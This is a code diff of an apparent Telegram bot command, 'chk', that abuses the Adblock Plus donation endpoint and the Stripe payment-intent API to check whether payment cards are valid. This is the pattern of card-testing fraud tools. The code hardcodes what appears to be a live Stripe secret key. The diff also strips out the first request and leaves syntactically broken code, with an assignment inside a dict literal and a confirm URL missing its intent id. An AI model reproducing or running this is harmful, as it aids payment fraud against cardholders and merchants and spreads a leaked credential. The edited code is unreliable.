@@ -149,20 +149,7 @@ def chk(update,context):
       "currencySign": "$"
     }
     
-    head = {
-      "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
-      "Content-Type": "application/x-www-form-urlencoded",
-      "Accept": "*/*",
-      "Origin": "https://adblockplus.org",
-      "Sec-Fetch-Dest": "empty",
-      "Referer": "https://adblockplus.org/",
-      "Accept-Language": "en-US,en;q=0.9"
-    }
-    
-    re = requests.post("https://new-integration.adblockplus.org/",
-                     data=payload, headers=head)
-    client = re.text
-    pi = client[0:27]
+
     
 
     load = {
@@ -183,7 +170,7 @@ def chk(update,context):
       "webauthn_uvpa_available": "true",
       "spc_eligible": "false",
       "key": "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",
-      "client_secret": client
+      "client_secret" = "noi"
     }
     
     header = {
@@ -195,7 +182,7 @@ def chk(update,context):
       "Accept-Language": "en-US,en;q=0.9"
     }
     
-    rx = requests.post(f"https://api.stripe.com/v1/payment_intents/{pi}/confirm",
+    rx = requests.post(f"https://api.stripe.com/v1/payment_intents",
                      data=load, headers=header)
     res = rx.json()
     msg = res["error"]["message"]
